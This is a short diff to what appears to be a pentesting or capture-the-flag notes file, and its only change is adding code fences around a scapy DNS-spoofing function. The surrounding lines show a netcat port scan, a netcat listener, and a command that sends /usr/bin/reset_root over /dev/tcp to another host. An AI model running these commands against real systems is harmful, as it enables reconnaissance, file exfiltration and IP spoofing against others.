@@ -6,6 +6,7 @@ nc -zv -w 1 <host> 20-1023
 nc -lvnp 3333 > reset_root
 cat /usr/bin/reset_root > /dev/tcp/192.168.10.10 3333
 # IP spoofing
+```
 from scapy.all import *
 
 def send_spoofed_dns_request():
@@ -27,7 +28,7 @@ def send_spoofed_dns_request():
 
 send_spoofed_dns_request()
 
-
+```
 
 
 
